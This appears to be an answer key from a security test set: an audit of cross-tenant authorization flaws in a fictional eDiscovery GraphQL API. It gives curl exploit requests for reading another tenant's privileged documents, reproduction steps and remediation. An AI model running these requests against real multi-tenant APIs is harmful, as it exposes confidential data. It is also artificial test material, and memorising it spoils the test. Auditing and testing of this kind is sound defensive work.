# Expected Response

## System
- System: LexVault eDiscovery API v3.3.4
- Domain: LEGAL TECH / DOCUMENT MANAGEMENT
- Example ID: GQL-0424
- Risk ID: RISK-GQL-424

## Findings

### 1. Pattern 1.7 — Nested Resources Without Parent Authorization: `getResourceWithChildren` (Primary Pattern)

The `getResourceWithChildren` resolver fetches a parent resource and all its child `items` by `resourceId` only, without verifying the parent's `tenantId` against the JWT. In the Legal Tech/eDiscovery context, a parent resource is a case or document set; its children are individual privileged documents or evidence items. An attacker accessing another tenant's parent resource automatically receives all nested child documents — including attorney-client privileged communications and confidential discovery materials.

```bash
# Access another tenant's case + all nested documents (Pattern 1.7 — nested without parent auth)
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0D65>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0d65" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2424\") { resourceId tenantId ownerId data { sensitiveField internalNotes } items { ... on Item { id tenantId data { sensitiveField } } } } }"}'
```
**Vulnerable outcome:** Returns `tenant-31e0`'s parent case with all nested child document items — full eDiscovery document tree exposed across tenant boundary.

### 2. Single-ID Cross-Tenant Document Read — `getResource` (HAR Primary)

HAR shows `getResource(id: "R-2424")` from `tenant-0d65` returning data for `tenant-31e0` (RISK-GQL-424).

```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0D65>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0d65" \
  -d '{"query": "query { getResource(id: \"R-2424\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-31e0"`, `sensitiveField: "CONFIDENTIAL-0d6531e0"`, `internalNotes` — attorney-client privileged documents exposed.

### 3. Bulk Cross-Tenant Document Enumeration — `bulkResourceLookup`

`bulkResourceLookup` is documented in Section 4.0 as accepting arbitrary IDs without per-ID ownership filtering.

```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0D65>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0d65" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2424\", \"R-3424\", \"R-4424\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```

### 4. Redis Cache Legal Document Leak

Cache key is `resourceId` only. Confidential legal documents for one tenant can be served from cache to another tenant.

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0D65>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0d65" \
  -d '{"query": "query { getResource(id: \"R-1424\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-0d65"`.

**Step 2 — Cross-tenant read (primary HAR attack):**
```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0D65>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0d65" \
  -d '{"query": "query { getResource(id: \"R-2424\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenantId: "tenant-31e0"` — BOLA confirmed.

**Step 3 — Nested document tree access without parent authorization (Pattern 1.7 primary):**
```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0D65>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-0d65" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2424\") { resourceId tenantId items { ... on Item { id tenantId data { sensitiveField } } } data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** All child documents returned for `tenant-31e0`'s case — full eDiscovery tree exposed.

## Secure Outcome Verification
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in `getResource` and `getResourceWithChildren` (RISK-GQL-424).
- Per-child authorization in `getResourceWithChildren`: validate each child item's `tenantId` before returning.
- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter by JWT `tenantId`.
- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
- Automated regression test: Tenant A token requests Tenant B resource — assert 403 or null data.
